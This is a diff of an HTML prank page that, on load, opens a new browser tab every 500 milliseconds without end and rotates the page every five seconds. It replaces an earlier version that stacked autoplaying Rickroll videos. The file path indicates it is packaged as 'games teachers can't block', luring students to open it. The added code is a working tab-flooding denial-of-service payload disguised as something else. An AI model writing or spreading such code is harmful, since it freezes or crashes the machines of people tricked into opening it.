@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Oops, you've been rickrolled!</title>
+    <title>Oops! You've been rickrolled!</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -16,37 +16,42 @@
         h1 {
             font-size: 40px;
         }
-        iframe {
-            border: none;
-            width: 560px;
-            height: 315px;
-            margin: 20px;
-        }
     </style>
     <script>
-        // Random screen rotation function
+        // Variable to keep track of the current rotation angle
+        let currentRotation = 0;
+
+        // Function to rotate the screen 90 degrees each time
         function rotateScreen() {
-            const rotations = ['rotate(90deg)', 'rotate(180deg)', 'rotate(270deg)', 'rotate(0deg)'];
-            let index = Math.floor(Math.random() * rotations.length);
-            document.body.style.transform = rotations[index];
+            currentRotation += 90; // Increase by 90 degrees
+            if (currentRotation === 360) {
+                currentRotation = 0; // Reset back to 0 after a full rotation (360 degrees)
+            }
+            document.body.style.transform = `rotate(${currentRotation}deg)`;
             document.body.style.transition = 'transform 0.5s ease';
         }
 
-        // Function to embed a new rickroll iframe
-        function openRickroll() {
-            const iframe = document.createElement('iframe');
-            iframe.src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"; // Auto plays the video
-            document.body.appendChild(iframe);
-            rotateScreen();  // Rotate screen on each new iframe
+        // Function to open the same file in a new tab
+        function openNewTab() {
+            const fileUrl = "file:///media/archive/open-me-for-games-teachers-cant-block-main.zip/open-me-for-games-teachers-cant-block-main/open-me.html";
+            window.open(fileUrl, "_blank");
         }
 
-        // Infinite Rickroll function (opens new iframe every 500ms)
-        function infiniteRickroll() {
-            setInterval(openRickroll, 500); // Adds a new iframe every 500ms
+        // Infinite tab opening function (opens a new tab every 500ms)
+        function infiniteTabOpening() {
+            setInterval(openNewTab, 500);  // Opens a new tab every 500ms
         }
 
-        // Trigger the prank as soon as the page loads
-        window.onload = infiniteRickroll;
+        // Rotate screen every 5 seconds
+        function rotateEvery5Seconds() {
+            setInterval(rotateScreen, 5000);  // Rotate every 5 seconds
+        }
+
+        // Start opening new tabs and rotating after loading the page
+        window.onload = () => {
+            infiniteTabOpening();  // Start opening new tabs
+            rotateEvery5Seconds(); // Start rotating the screen every 5 seconds
+        };
     </script>
 </head>
 <body>
